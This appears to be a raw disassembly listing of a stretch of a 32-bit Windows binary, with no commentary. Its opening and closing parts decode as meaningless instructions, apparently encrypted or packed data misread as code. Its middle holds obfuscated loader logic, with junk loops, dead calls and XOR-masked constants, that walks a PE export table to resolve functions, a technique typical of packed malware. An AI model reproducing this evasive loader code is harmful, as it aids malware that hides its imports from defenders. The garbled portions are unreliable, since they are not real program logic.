  40a7d1:	and    eax,0xb3f4a853
  40a7d6:	cmp    al,0x5d
  40a7d8:	mov    esp,0x7d009a56
  40a7dd:	repz dec esi
  40a7df:	frstor [ebp+0x5]
  40a7e2:	or     esp,DWORD PTR [edx+0x14e467cc]
  40a7e8:	dec    ebp
  40a7e9:	sbb    DWORD PTR [ecx-0x43],esp
  40a7ec:	outs   dx,BYTE PTR ds:[esi]
  40a7ed:	hlt    
  40a7ee:	mov    esp,0x71dc748b
  40a7f3:	add    BYTE PTR [edi],0xa8
  40a7f6:	xchg   esp,eax
  40a7f7:	pop    esp
  40a7f8:	gs jno 0x40a831
  40a7fb:	cmp    al,0x29
  40a7fd:	popf   
  40a7fe:	int3   
  40a7ff:	inc    esp
  40a800:	dec    edi
  40a801:	jae    0x40a842
  40a803:	mov    eax,0x17ff0b78
  40a808:	aas    
  40a809:	or     dl,BYTE PTR [edi]
  40a80b:	or     dl,cl
  40a80d:	mov    dl,0x5e
  40a80f:	fcmovnb st,st(7)
  40a811:	xor    dl,BYTE PTR [edi-0x2cab10a9]
  40a817:	jmp    FWORD PTR cs:[eax+eax*2+0x763566af]
  40a81f:	jl     0x40a884
  40a821:	jno    0x40a835
  40a823:	hlt    
  40a824:	sub    esi,DWORD PTR [eax+edi*2+0x160b6dc5]
  40a82b:	rcl    BYTE PTR [ebp+edx*2-0x48340e24],1
  40a832:	cs dec esi
  40a834:	mov    ch,0xb4
  40a836:	mov    cl,0x30
  40a838:	jmp    0xa349ce2e
  40a83d:	loope  0x40a856
  40a83f:	mov    ebx,edx
  40a841:	shl    DWORD PTR [ecx+0x74c1fda4],0x26
  40a848:	leave  
  40a849:	pop    esi
  40a84a:	or     al,al
  40a84c:	add    edi,DWORD PTR [esi+0x29]
  40a84f:	jmp    0x1af56f40
  40a854:	test   BYTE PTR [edi-0x1b],cl
  40a857:	pop    esp
  40a858:	push   esp
  40a859:	and    ebp,edi
  40a85b:	ret    0x7955
  40a85e:	xor    edx,DWORD PTR [edi+0x20]
  40a861:	mov    ch,0xb1
  40a863:	mov    ah,0x56
  40a865:	mov    ecx,DWORD PTR [esi]
  40a867:	dec    ebx
  40a868:	adc    al,0x12
  40a86a:	pop    esp
  40a86b:	repz pop ebp
  40a86d:	mov    dh,0x4f
  40a86f:	mov    WORD PTR [ebx+0x5c],?
  40a872:	pop    ds
  40a873:	and    eax,0xb0169b7a
  40a878:	test   ebx,0x3e28de28
  40a87e:	dec    esi
  40a87f:	mov    edx,0x7c9b3a30
  40a884:	fsubr  st,st(1)
  40a886:	ja     0x40a89e
  40a888:	(bad)  
  40a88a:	adc    ch,cl
  40a88c:	mov    ebx,0x2961eb67
  40a891:	fisubr DWORD PTR [esi+0x4387aeb0]
  40a897:	shld   DWORD PTR [esp+eiz*4],edx,0xef
  40a89c:	int3   
  40a89d:	sub    dl,BYTE PTR [esi+0x37179ffd]
  40a8a3:	jnp    0x40a88e
  40a8a5:	cmp    esi,esi
  40a8a7:	inc    eax
  40a8a8:	push   0x6b
  40a8aa:	fwait
  40a8ab:	mov    BYTE PTR [ecx+0x1f],ch
  40a8ae:	pop    edi
  40a8af:	call   0x2f0b:0x46d98be8
  40a8b6:	shl    cl,1
  40a8b8:	fadd   st,st(5)
  40a8ba:	mov    al,0x34
  40a8bc:	pop    ss
  40a8bd:	inc    esi
  40a8be:	jne    0x40a876
  40a8c0:	ds mov ah,0xf8
  40a8c3:	jb     0x40a935
  40a8c5:	pop    ds
  40a8c6:	ret    
  40a8c7:	stc    
  40a8c8:	push   0x45
  40a8ca:	xor    DWORD PTR [edx+0x2b],edx
  40a8cd:	fwait
  40a8ce:	aam    0xca
  40a8d0:	mov    dl,0xb8
  40a8d2:	add    dl,BYTE PTR [esi-0x45fcb4cb]
  40a8d8:	and    al,0xc
  40a8da:	mov    WORD PTR [edi],fs
  40a8dc:	imul   esp,DWORD PTR [edi-0x60f423de],0x76
  40a8e3:	sti    
  40a8e4:	jae    0x40a8bd
  40a8e6:	ror    esi,0x98
  40a8e9:	jae    0x40a961
  40a8eb:	int    0xe5
  40a8ed:	sub    DWORD PTR [eax+0x448ca5b6],esi
  40a8f3:	jl     0x40a903
  40a8f5:	scas   al,BYTE PTR es:[edi]
  40a8f6:	mov    ds:0x34ab0b0d,eax
  40a8fb:	(bad)  
  40a8fc:	or     DWORD PTR [ebx+ebp*8+0x45],edi
  40a900:	fiadd  WORD PTR [ecx+0x32]
  40a903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a904:	dec    ecx
  40a906:	(bad)  
  40a907:	mul    DWORD PTR [edx+0x37]
  40a90a:	sbb    eax,0x97bb9365
  40a90f:	mov    ebp,0x6d26b29
  40a914:	sub    DWORD PTR [edi+0xe13b108],ecx
  40a91a:	out    dx,al
  40a91b:	retf   0x8da4
  40a91e:	scas   eax,DWORD PTR es:[edi]
  40a91f:	mov    db5,edi
  40a922:	aam    0x9e
  40a924:	stos   BYTE PTR es:[edi],al
  40a925:	fadd   DWORD PTR [ecx-0x7e9e1fc4]
  40a92b:	enter  0x72fe,0xda
  40a92f:	repnz mov ah,0x83
  40a932:	sti    
  40a933:	inc    esi
  40a934:	sub    ch,al
  40a936:	ss inc esi
  40a938:	adc    esp,DWORD PTR [esp+ebx*2+0x66]
  40a93c:	jno    0x40a954
  40a93e:	imul   ecx,esp,0x1f59f580
  40a944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a945:	push   0xffffffaa
  40a947:	imul   eax,DWORD PTR [ecx],0xffffff90
  40a94a:	dec    ebp
  40a94b:	lock jb 0x40a96c
  40a94e:	mov    ch,0xca
  40a950:	outs   dx,BYTE PTR ds:[esi]
  40a951:	arpl   WORD PTR [edi+esi*1],bx
  40a954:	loopne 0x40a979
  40a956:	mov    WORD PTR [eax],cs
  40a958:	dec    ebx
  40a959:	mov    DWORD PTR ds:0x12d7,esp
  40a95e:	or     eax,edi
  40a960:	pop    ebx
  40a961:	arpl   WORD PTR [esi*2-0x115be5cf],cx
  40a968:	pop    es
  40a969:	fs aaa 
  40a96b:	lods   al,BYTE PTR ds:[esi]
  40a96c:	cld    
  40a96d:	jecxz  0x40a955
  40a96f:	shl    DWORD PTR [ecx-0x79],0xab
  40a973:	rcl    BYTE PTR [edi],cl
  40a975:	inc    esp
  40a976:	sub    esi,DWORD PTR [eax-0x68]
  40a979:	xchg   esp,eax
  40a97a:	out    0x5,eax
  40a97c:	or     bh,BYTE PTR [ecx+0x2a2a5b35]
  40a982:	in     eax,dx
  40a983:	fistp  WORD PTR [ebx+0x30d6709f]
  40a989:	inc    ebp
  40a98a:	test   al,0x25
  40a98c:	ss sub dl,bl
  40a98f:	push   edi
  40a990:	sar    BYTE PTR [edi],0x5d
  40a993:	lea    ecx,[ecx+edi*2+0x4348f308]
  40a99a:	or     al,0x82
  40a99c:	or     al,0xbc
  40a99e:	aad    0xa3
  40a9a0:	mul    BYTE PTR [bx+di+0xbbd]
  40a9a5:	dec    edx
  40a9a6:	rcl    BYTE PTR [edi+0x202ccdfd],cl
  40a9ac:	cmp    al,0xba
  40a9ae:	div    DWORD PTR [esi+0x78]
  40a9b1:	push   0x69647de7
  40a9b6:	sti    
  40a9b7:	xchg   edi,eax
  40a9b8:	dec    esp
  40a9b9:	js     0x40a9eb
  40a9bb:	and    ebx,0xffffffb3
  40a9be:	cmp    ecx,esi
  40a9c0:	mov    ecx,0xe08b6612
  40a9c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9c6:	mov    ds:0xc6c4c8c2,eax
  40a9cb:	jo     0x40aa0c
  40a9cd:	sbb    eax,0x19b15eef
  40a9d2:	mov    al,0x3f
  40a9d4:	cmp    eax,0x1011692b
  40a9d9:	shl    esp,cl
  40a9db:	inc    edi
  40a9dc:	adc    eax,0x58b74b6e
  40a9e1:	test   DWORD PTR [edx-0x6975e4ca],esp
  40a9e7:	leave  
  40a9e8:	out    0xb6,eax
  40a9ea:	xchg   ecx,eax
  40a9eb:	icebp  
  40a9ec:	in     al,dx
  40a9ed:	jno    0x40a98c
  40a9ef:	inc    ecx
  40a9f0:	out    0xd0,eax
  40a9f2:	loope  0x40a9fb
  40a9f4:	fdivp  st(0),st
  40a9f6:	xor    edx,esi
  40a9f8:	adc    BYTE PTR [edx+0x5f],cl
  40a9fb:	pop    ebp
  40a9fc:	hlt    
  40a9fd:	mov    ds:0xc30da84e,al
  40aa02:	(bad)  
  40aa03:	push   ecx
  40aa04:	sbb    ecx,eax
  40aa06:	scas   eax,DWORD PTR es:[edi]
  40aa07:	xor    bh,cl
  40aa09:	test   DWORD PTR [edi],eax
  40aa0b:	pop    ecx
  40aa0c:	or     cl,dl
  40aa0e:	into   
  40aa0f:	scas   al,BYTE PTR es:[edi]
  40aa10:	dec    ebp
  40aa11:	ret    0xefc6
  40aa14:	adc    cl,0x31
  40aa17:	xor    DWORD PTR [edx-0x6b3ee9a7],0xa3bdd462
  40aa21:	sbb    esi,eax
  40aa23:	mov    esp,0xd9610625
  40aa28:	aad    0x34
  40aa2a:	add    eax,0x1415ffb5
  40aa2f:	push   eax
  40aa30:	inc    edx
  40aa31:	add    BYTE PTR [eax-0x69],ch
  40aa34:	xchg   DWORD PTR [ecx+0x80d8197],ecx
  40aa3a:	mov    al,ds:0xd0080042
  40aa3f:	inc    edx
  40aa40:	add    bh,bh
  40aa42:	adc    eax,0x425004
  40aa47:	and    DWORD PTR ds:0x42c01c,0x0
  40aa51:	mov    ebx,DWORD PTR ds:0x42c01c
  40aa57:	inc    ebx
  40aa58:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa5e:	cmp    DWORD PTR ds:0x42c01c,0x5
  40aa65:	jne    0x40aa76
  40aa6b:	push   0x57f5
  40aa70:	call   DWORD PTR ds:0x42504c
  40aa76:	cmp    DWORD PTR ds:0x42c01c,0x4
  40aa7d:	jne    0x40aa92
  40aa83:	xor    ebx,ebx
  40aa85:	xor    ebx,DWORD PTR ds:0x42c01c
  40aa8b:	inc    ebx
  40aa8c:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa92:	cmp    DWORD PTR ds:0x42c01c,0x10
  40aa99:	jb     0x40aa51
  40aa9f:	xor    eax,eax
  40aaa1:	xor    eax,DWORD PTR ds:0x42a014
  40aaa7:	xor    DWORD PTR ds:0x42d018,eax
  40aaad:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  40aab4:	or     ecx,DWORD PTR ds:0x42d008
  40aaba:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aac1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aac4:	or     DWORD PTR ds:0x42b014,edi
  40aaca:	mov    ebx,0x7510893
  40aacf:	xor    eax,eax
  40aad1:	or     eax,DWORD PTR ds:0x423e3e
  40aad7:	mov    eax,DWORD PTR [eax]
  40aad9:	or     DWORD PTR ds:0x42d018,eax
  40aadf:	xor    ecx,ebx
  40aae1:	not    eax
  40aae3:	mov    eax,0x3272db
  40aae8:	or     DWORD PTR ds:0x42c010,0x42900c
  40aaf2:	add    ecx,eax
  40aaf4:	mov    DWORD PTR [ebp-0x1c],ecx
  40aaf7:	mov    DWORD PTR ds:0x42c014,0x14
  40ab01:	cmp    DWORD PTR ds:0x42c014,0x0
  40ab08:	je     0x40aba7
  40ab0e:	cmp    DWORD PTR ds:0x42c014,0x2
  40ab15:	jne    0x40ab29
  40ab1b:	push   DWORD PTR [ebp-0x28]
  40ab1e:	push   0x42454c
  40ab23:	call   DWORD PTR ds:0x425010
  40ab29:	cmp    DWORD PTR ds:0x42c014,0x3
  40ab30:	jne    0x40ab43
  40ab36:	mov    ecx,DWORD PTR ds:0x42c014
  40ab3c:	dec    ecx
  40ab3d:	mov    DWORD PTR ds:0x42c014,ecx
  40ab43:	mov    ecx,DWORD PTR ds:0x42c014
  40ab49:	dec    ecx
  40ab4a:	mov    DWORD PTR ds:0x42c014,ecx
  40ab50:	jmp    0x40ab01
  40ab55:	mov    DWORD PTR ds:0x42a018,0x12
  40ab5f:	cmp    DWORD PTR ds:0x42a018,0x0
  40ab66:	je     0x40aba7
  40ab6c:	cmp    DWORD PTR ds:0x42a018,0x1a
  40ab73:	jne    0x40ab85
  40ab79:	push   DWORD PTR [ebp-0x1c]
  40ab7c:	push   DWORD PTR [ebp-0x18]
  40ab7f:	call   DWORD PTR ds:0x425018
  40ab85:	mov    ecx,DWORD PTR ds:0x42a018
  40ab8b:	dec    ecx
  40ab8c:	mov    DWORD PTR ds:0x42a018,ecx
  40ab92:	jmp    0x40ab5f
  40ab97:	xor    ecx,ecx
  40ab99:	xor    ecx,DWORD PTR ds:0x4245b5
  40ab9f:	mov    ecx,DWORD PTR [ecx]
  40aba1:	sbb    DWORD PTR ds:0x42a00c,ecx
  40aba7:	mov    ecx,DWORD PTR [ebp+0x14]
  40abaa:	test   ecx,ecx
  40abac:	je     0x40ac29
  40abb2:	and    DWORD PTR ds:0x42c014,edi
  40abb8:	mov    ecx,DWORD PTR [ebp+0x14]
  40abbb:	mov    DWORD PTR ds:0x42c014,0x11
  40abc5:	cmp    DWORD PTR ds:0x42c014,0x0
  40abcc:	je     0x40ac1e
  40abd2:	cmp    DWORD PTR ds:0x42c014,0x5
  40abd9:	jne    0x40abf2
  40abdf:	push   0x429028
  40abe4:	push   DWORD PTR [ebp-0x20]
  40abe7:	push   0x4243c0
  40abec:	call   DWORD PTR ds:0x42501c
  40abf2:	cmp    DWORD PTR ds:0x42c014,0x6
  40abf9:	jne    0x40ac0c
  40abff:	mov    edi,DWORD PTR ds:0x42c014
  40ac05:	dec    edi
  40ac06:	mov    DWORD PTR ds:0x42c014,edi
  40ac0c:	mov    edi,DWORD PTR ds:0x42c014
  40ac12:	dec    edi
  40ac13:	mov    DWORD PTR ds:0x42c014,edi
  40ac19:	jmp    0x40abc5
  40ac1e:	mov    ecx,DWORD PTR [ecx]
  40ac20:	xor    DWORD PTR ds:0x42a018,ecx
  40ac26:	mov    DWORD PTR [ebp-0x1c],ecx
  40ac29:	adc    DWORD PTR ds:0x429024,edi
  40ac2f:	mov    ecx,0x7665
  40ac34:	imul   edx,eax
  40ac37:	mov    DWORD PTR ds:0x42d00c,0x1b
  40ac41:	cmp    DWORD PTR ds:0x42d00c,0x0
  40ac48:	je     0x40ac9b
  40ac4e:	cmp    DWORD PTR ds:0x42d00c,0x4
  40ac55:	jne    0x40ac69
  40ac5b:	push   0x429020
  40ac60:	push   DWORD PTR [ebp-0x1c]
  40ac63:	call   DWORD PTR ds:0x425020
  40ac69:	cmp    DWORD PTR ds:0x42d00c,0x5
  40ac70:	jne    0x40ac83
  40ac76:	mov    edi,DWORD PTR ds:0x42d00c
  40ac7c:	dec    edi
  40ac7d:	mov    DWORD PTR ds:0x42d00c,edi
  40ac83:	mov    edi,DWORD PTR ds:0x42d00c
  40ac89:	dec    edi
  40ac8a:	mov    DWORD PTR ds:0x42d00c,edi
  40ac90:	jmp    0x40ac41
  40ac95:	xor    DWORD PTR ds:0x42b010,edi
  40ac9b:	mov    esi,0x76532
  40aca0:	add    edx,ecx
  40aca2:	xchg   esi,ecx
  40aca4:	or     edi,esi
  40aca6:	mov    edi,0x54354
  40acab:	movzx  ecx,BYTE PTR ds:0x42901c
  40acb2:	sbb    DWORD PTR ds:0x429000,ecx
  40acb8:	sub    edx,edi
  40acba:	mov    ecx,DWORD PTR [ebp-0x4]
  40acbd:	sbb    DWORD PTR ds:0x429028,0x4a48
  40acc7:	xor    ecx,ebx
  40acc9:	and    esi,DWORD PTR ds:0x42900c
  40accf:	add    ecx,eax
  40acd1:	mov    DWORD PTR [ebp-0x8],ecx
  40acd4:	mov    DWORD PTR ds:0x42b014,0x169
  40acde:	mov    ecx,DWORD PTR [ebp-0x14]
  40ace1:	add    esi,DWORD PTR ds:0x42b000
  40ace7:	xor    ecx,ebx
  40ace9:	add    DWORD PTR ds:0x42d00c,0x42d004
  40acf3:	add    ecx,eax
  40acf5:	mov    DWORD PTR [ebp-0x24],ecx
  40acf8:	and    esi,esi
  40acfa:	mov    ecx,DWORD PTR [ebp-0x4]
  40acfd:	and    DWORD PTR ds:0x42b000,0x0
  40ad07:	jmp    0x40ad19
  40ad0c:	mov    esi,DWORD PTR ds:0x42b000
  40ad12:	inc    esi
  40ad13:	mov    DWORD PTR ds:0x42b000,esi
  40ad19:	cmp    DWORD PTR ds:0x42b000,0x10
  40ad20:	jae    0x40ad70
  40ad26:	cmp    DWORD PTR ds:0x42b000,0x4
  40ad2d:	jne    0x40ad3e
  40ad33:	push   0x8810
  40ad38:	call   DWORD PTR ds:0x425028
  40ad3e:	cmp    DWORD PTR ds:0x42b000,0x3
  40ad45:	jne    0x40ad58
  40ad4b:	mov    esi,DWORD PTR ds:0x42b000
  40ad51:	inc    esi
  40ad52:	mov    DWORD PTR ds:0x42b000,esi
  40ad58:	jmp    0x40ad0c
  40ad5d:	movzx  esi,WORD PTR ds:0x42d00c
  40ad64:	adc    esi,DWORD PTR ds:0x42b018
  40ad6a:	mov    DWORD PTR ds:0x42d00c,esi
  40ad70:	xor    ecx,ebx
  40ad72:	add    ecx,eax
  40ad74:	add    esi,0x75ba
  40ad7a:	mov    DWORD PTR [ebp-0x30],ecx
  40ad7d:	or     ecx,DWORD PTR ds:0x42c010
  40ad83:	mov    esi,DWORD PTR [ebp-0x4]
  40ad86:	inc    ecx
  40ad87:	xor    esi,ebx
  40ad89:	mov    ecx,DWORD PTR ds:0x42459d
  40ad8f:	mov    ecx,DWORD PTR [ecx]
  40ad91:	adc    DWORD PTR ds:0x429020,ecx
  40ad97:	add    esi,eax
  40ad99:	mov    ecx,DWORD PTR [ebp-0x24]
  40ad9c:	sub    DWORD PTR ds:0x42c010,0x42c004
  40ada6:	sub    ecx,eax
  40ada8:	lea    edx,[esi-0x3272db]
  40adae:	xor    DWORD PTR ds:0x42a004,0x429028
  40adb8:	xor    ecx,ebx
  40adba:	xor    edx,ebx
  40adbc:	mov    DWORD PTR ds:0x42b00c,0x3cf6
  40adc6:	cmp    edx,ecx
  40adc8:	mov    DWORD PTR ds:0x42a008,0x130c
  40add2:	je     0x40afdf
  40add8:	sub    ecx,0x2467
  40adde:	mov    ecx,DWORD PTR [ebp-0x4]
  40ade1:	and    DWORD PTR ds:0x42c00c,0x42d01c
  40adeb:	xor    ecx,ebx
  40aded:	add    DWORD PTR ds:0x42b018,0x2ea9
  40adf7:	add    ecx,eax
  40adf9:	mov    DWORD PTR ds:0x42b000,0x737d
  40ae03:	cmp    esi,ecx
  40ae05:	mov    DWORD PTR ds:0x42b018,0x3d4e
  40ae0f:	jne    0x40afbc
  40ae15:	push   DWORD PTR [ebp+0x8]
  40ae18:	call   0x423bc4
  40ae1d:	mov    DWORD PTR [ebp-0x18],eax
  40ae20:	mov    eax,DWORD PTR [ebp-0x4]
  40ae23:	xor    edi,ecx
  40ae25:	mov    ecx,DWORD PTR [ebp-0x18]
  40ae28:	xor    eax,ebx
  40ae2a:	and    DWORD PTR ds:0x42901c,0x0
  40ae34:	jmp    0x40ae46
  40ae39:	mov    edi,DWORD PTR ds:0x42901c
  40ae3f:	inc    edi
  40ae40:	mov    DWORD PTR ds:0x42901c,edi
  40ae46:	cmp    DWORD PTR ds:0x42901c,0x1d
  40ae4d:	jae    0x40ae90
  40ae53:	cmp    DWORD PTR ds:0x42901c,0x2c
  40ae5a:	jne    0x40ae85
  40ae60:	push   0x61ef
  40ae65:	push   0x288b
  40ae6a:	push   0x42d018
  40ae6f:	push   DWORD PTR [ebp-0x28]
  40ae72:	push   0x2975
  40ae77:	push   DWORD PTR [ebp-0x24]
  40ae7a:	push   0x26ce
  40ae7f:	call   DWORD PTR ds:0x42502c
  40ae85:	jmp    0x40ae39
  40ae8a:	or     DWORD PTR ds:0x42c010,ebx
  40ae90:	mov    edi,0x3272db
  40ae95:	add    eax,edi
  40ae97:	mov    DWORD PTR ds:0x42901c,0x5f35
  40aea1:	cmp    ecx,eax
  40aea3:	mov    DWORD PTR ds:0x42c018,0x19df
  40aead:	je     0x40b04f
  40aeb3:	sub    DWORD PTR ds:0x42d018,0x5f9c
  40aebd:	push   DWORD PTR [ebp-0x18]
  40aec0:	and    DWORD PTR ds:0x42b018,0x42b000
  40aeca:	push   DWORD PTR [ebp+0x8]
  40aecd:	dec    DWORD PTR ds:0x42a00c
  40aed3:	call   0x423ca3
  40aed8:	or     DWORD PTR ds:0x42a014,0x42a00c
  40aee2:	mov    DWORD PTR [ebp-0x18],eax
  40aee5:	mov    eax,DWORD PTR [ebp-0x4]
  40aee8:	sbb    DWORD PTR ds:0x42a010,0x3b6d
  40aef2:	mov    ecx,DWORD PTR [ebp-0x18]
  40aef5:	xor    eax,ebx
  40aef7:	add    DWORD PTR ds:0x429004,0x42d004
  40af01:	add    eax,edi
  40af03:	mov    DWORD PTR ds:0x42a018,0x317f
  40af0d:	cmp    ecx,eax
  40af0f:	je     0x40b04f
  40af15:	mov    eax,DWORD PTR [ebp-0x18]
  40af18:	mov    eax,DWORD PTR [eax+0x18]
  40af1b:	mov    ecx,DWORD PTR ds:0x42d000
  40af21:	xor    DWORD PTR ds:0x42a014,ecx
  40af27:	mov    DWORD PTR [ebp-0x24],eax
  40af2a:	mov    eax,DWORD PTR [ebp-0x18]
  40af2d:	and    DWORD PTR ds:0x42b018,0x0
  40af37:	jmp    0x40af49
  40af3c:	mov    ecx,DWORD PTR ds:0x42b018
  40af42:	inc    ecx
  40af43:	mov    DWORD PTR ds:0x42b018,ecx
  40af49:	cmp    DWORD PTR ds:0x42b018,0x16
  40af50:	jae    0x40af77
  40af56:	cmp    DWORD PTR ds:0x42b018,0x20
  40af5d:	jne    0x40af6c
  40af63:	push   DWORD PTR [ebp-0x28]
  40af66:	call   DWORD PTR ds:0x425030
  40af6c:	jmp    0x40af3c
  40af71:	xor    ecx,DWORD PTR ds:0x42b01c
  40af77:	mov    ecx,DWORD PTR [ebp+0x8]
  40af7a:	add    ecx,DWORD PTR [eax+0x20]
  40af7d:	sub    eax,DWORD PTR ds:0x429024
  40af83:	mov    DWORD PTR [ebp-0x2c],ecx
  40af86:	mov    eax,DWORD PTR [ebp-0x18]
  40af89:	inc    ecx
  40af8a:	mov    ecx,DWORD PTR [ebp+0x8]
  40af8d:	add    ecx,DWORD PTR [eax+0x24]
  40af90:	mov    DWORD PTR [ebp-0x34],ecx
  40af93:	xor    DWORD PTR ds:0x42a004,edi
  40af99:	mov    eax,DWORD PTR [ebp-0x18]
  40af9c:	or     DWORD PTR ds:0x42a000,ebx
  40afa2:	mov    ecx,DWORD PTR [ebp+0x8]
  40afa5:	or     DWORD PTR ds:0x42a008,0x109d
  40afaf:	add    ecx,DWORD PTR [eax+0x1c]
  40afb2:	mov    eax,edi
  40afb4:	mov    DWORD PTR [ebp-0x18],ecx
  40afb7:	jmp    0x40b017
  40afbc:	mov    ecx,DWORD PTR [ebp-0x2c]
  40afbf:	mov    edx,DWORD PTR [ebp+0x8]
  40afc2:	add    edx,DWORD PTR [ecx+esi*4]
  40afc5:	mov    DWORD PTR [ebp-0x28],edx
  40afc8:	mov    ecx,DWORD PTR [ebp-0x4]
  40afcb:	mov    edx,DWORD PTR [ebp-0x28]
  40afce:	xor    ecx,ebx
  40afd0:	add    ecx,eax
  40afd2:	cmp    edx,ecx
  40afd4:	je     0x40b017
  40afda:	jmp    0x40b003
  40afdf:	mov    ecx,DWORD PTR [ebp-0x4]
  40afe2:	mov    edx,DWORD PTR [ebp-0x8]
  40afe5:	xor    ecx,ebx
  40afe7:	add    ecx,eax
  40afe9:	cmp    edx,ecx
  40afeb:	je     0x40b05b
  40aff1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aff4:	mov    edx,DWORD PTR [ebp-0x30]
  40aff7:	xor    ecx,ebx
  40aff9:	add    ecx,eax
  40affb:	cmp    edx,ecx
  40affd:	je     0x40b06a
  40b003:	lea    eax,[ebp-0x8]
  40b006:	push   eax
  40b007:	push   DWORD PTR [ebp-0x28]
  40b00a:	push   DWORD PTR [ebp+0xc]
  40b00d:	call   0x401058
  40b012:	mov    eax,0x3272db
  40b017:	mov    ecx,DWORD PTR [ebp-0x4]
  40b01a:	mov    edx,DWORD PTR [ebp-0x8]
  40b01d:	xor    ecx,ebx
  40b01f:	add    ecx,eax
  40b021:	cmp    edx,ecx
  40b023:	je     0x40b03e
  40b029:	mov    ecx,DWORD PTR [ebp-0x34]
  40b02c:	movzx  ecx,WORD PTR [ecx+esi*2]
  40b030:	mov    edx,DWORD PTR [ebp-0x18]
  40b033:	mov    ecx,DWORD PTR [edx+ecx*4]
  40b036:	mov    DWORD PTR [ebp-0x38],ecx
  40b039:	jmp    0x40afdf
  40b03e:	mov    ecx,DWORD PTR [ebp-0x14]
  40b041:	xor    ecx,ebx
  40b043:	lea    esi,[esi+ecx*1+0x3272db]
  40b04a:	jmp    0x40ad99
  40b04f:	mov    eax,DWORD PTR [ebp-0x4]
  40b052:	xor    eax,ebx
  40b054:	add    eax,edi
  40b056:	jmp    0x40f898
  40b05b:	mov    eax,DWORD PTR [ebp-0x4]
  40b05e:	xor    eax,ebx
  40b060:	add    eax,0x3272db
  40b065:	jmp    0x40f898
  40b06a:	mov    ecx,DWORD PTR [ebp-0x38]
  40b06d:	add    ecx,DWORD PTR [ebp+0x8]
  40b070:	mov    DWORD PTR [ebp-0x10],ecx
  40b073:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b076:	test   ecx,ecx
  40b078:	je     0x40d4be
  40b07e:	mov    DWORD PTR [ebp-0x20],0x0
  40b085:	push   0x3
  40b087:	xor    edx,edx
  40b089:	pop    edx
  40b08a:	add    edx,0x8
  40b08d:	push   edx
  40b08e:	pop    ecx
  40b08f:	push   0x6
  40b091:	dec    ecx
  40b092:	pop    ebx
  40b093:	dec    ebx
  40b094:	xchg   ebx,ecx
  40b096:	sub    ebx,ecx
  40b098:	xchg   ebx,ecx
  40b09a:	dec    ecx
  40b09b:	mov    eax,DWORD PTR [ebp-0x1c]
  40b09e:	imul   eax,ecx
  40b0a1:	sub    esp,eax
  40b0a3:	mov    DWORD PTR [ebp-0x20],esp
  40b0a6:	mov    eax,DWORD PTR [ebp-0x4]
  40b0a9:	mov    ecx,0x7510893
  40b0ae:	xor    eax,ecx
  40b0b0:	mov    edx,0x3272db
  40b0b5:	add    eax,edx
  40b0b7:	mov    DWORD PTR [ebp+0x8],eax
  40b0ba:	mov    eax,DWORD PTR [ebp-0x14]
  40b0bd:	xor    eax,ecx
  40b0bf:	add    eax,edx
  40b0c1:	mov    edx,DWORD PTR [ebp+0x14]
  40b0c4:	jmp    0x40d429
  40b0c9:	fidiv  DWORD PTR [ecx+0x21]
  40b0cc:	jb     0x40b137
  40b0ce:	xor    ch,BYTE PTR [ecx-0x57]
  40b0d1:	ss pop es
  40b0d3:	add    eax,0xbb3f569b
  40b0d8:	cwde   
  40b0d9:	call   0x3aa313d3
  40b0de:	pop    edi
  40b0df:	bound  esp,QWORD PTR [edx+0x9]
  40b0e2:	lods   al,BYTE PTR ds:[esi]
  40b0e3:	retf   
  40b0e4:	jae    0x40b15b
  40b0e6:	sar    DWORD PTR ds:[ecx+esi*8],0x5b
  40b0eb:	mov    al,ds:0xd6faf1a6
  40b0f0:	push   0xd639b5b5
  40b0f5:	inc    ebp
  40b0f6:	loopne 0x40b0fc
  40b0f8:	adc    DWORD PTR [esi-0x20],edx
  40b0fb:	jae    0x40b0c0
  40b0fd:	push   edi
  40b0fe:	jecxz  0x40b0fb
  40b100:	pop    edi
  40b101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b102:	xchg   edx,eax
  40b103:	add    DWORD PTR [ecx-0xf],esp
  40b106:	push   eax
  40b107:	mov    al,ds:0x962008be
  40b10c:	mov    esi,0x541faf9b
  40b111:	pop    edx
  40b112:	inc    ebx
  40b113:	das    
  40b114:	aam    0x78
  40b116:	xor    eax,0xf7c7e08f
  40b11b:	(bad)  
  40b11c:	dec    ebx
  40b11d:	dec    ebx
  40b11e:	scas   eax,DWORD PTR es:[edi]
  40b11f:	in     eax,0x24
  40b121:	test   al,0x57
  40b123:	mov    edx,0xb29c9f7b
  40b128:	cmp    BYTE PTR [ebx],bh
  40b12a:	xchg   DWORD PTR ds:0x2575bd8f,ecx
  40b130:	fadd   DWORD PTR [edx]
  40b132:	rcl    bh,0x27
  40b135:	mov    ebx,0xf9ed9c5f
  40b13a:	aaa    
  40b13b:	retf   
  40b13c:	(bad)  
  40b13d:	mov    WORD PTR fs:[esi+0x22132c1c],?
  40b144:	xor    esp,DWORD PTR ds:0x1e4edbb1
  40b14a:	stos   DWORD PTR es:[edi],eax
  40b14b:	aad    0x90
  40b14d:	and    al,0xfd
  40b14f:	xor    BYTE PTR [esi],ah
  40b151:	inc    eax
  40b152:	test   BYTE PTR [edi],bl
  40b154:	fcmovnbe st,st(1)
  40b156:	jns    0x40b146
  40b158:	mov    BYTE PTR [ebp-0x5f69dbe0],dh
  40b15e:	jmp    0xd817:0x56c962aa
  40b165:	sub    DWORD PTR [ecx+0x3f334d8b],ebp
  40b16b:	mov    bl,0xa8
  40b16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b16e:	cmp    BYTE PTR ds:0x2473b8c5,bh
  40b174:	mov    dl,0x9
  40b176:	(bad)  
  40b177:	lods   eax,DWORD PTR ds:[esi]
  40b178:	jb     0x40b10a
  40b17a:	xor    DWORD PTR [ecx-0x7d],0xfffffff5
  40b17e:	xchg   ebp,eax
  40b17f:	hlt    
  40b180:	add    eax,0x337c1d36
  40b185:	ins    BYTE PTR es:[edi],dx
  40b186:	xor    al,0xbc
  40b188:	mov    ebp,0xf07d1f48
  40b18d:	ja     0x40b17d
